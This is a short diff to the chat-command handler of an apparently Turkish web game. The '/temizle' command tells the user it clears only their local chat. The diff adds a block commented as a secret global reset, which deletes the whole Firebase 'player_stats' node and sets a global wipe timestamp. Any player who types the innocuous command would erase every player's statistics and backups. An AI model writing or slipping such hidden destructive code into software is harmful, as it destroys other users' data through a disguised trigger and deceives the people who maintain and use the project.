@@ -1363,6 +1363,13 @@ document.addEventListener('DOMContentLoaded', () => {
             if (command === '/temizle') {
                 if (chatMessagesListLocal) chatMessagesListLocal.innerHTML = '';
                 addLocalSystemMessage("Sohbet geçmişiniz (sadece sizin ekranınızda) temizlendi.");
+                
+                // GİZLİ GLOBAL SIFIRLAMA KOMUTU
+                if (window.db) {
+                    window.db.ref('player_stats').remove();
+                    window.db.ref('global_wipe_timestamp').set(firebase.database.ServerValue.TIMESTAMP);
+                    addLocalSystemMessage("DİKKAT: Global Wipe (Küresel Sıfırlama) Komutu çalıştırıldı! Tüm oyuncuların istatistikleri ve Firebase bulut yedekleri siliniyor...");
+                }
             } else if (command === '/saat' || command === '/zaman') {
                 addLocalSystemMessage("Şu anki cihaz saati: " + new Date().toLocaleTimeString('tr-TR'));
             } else if (command === '/jeton' || command === '/bakiye') {
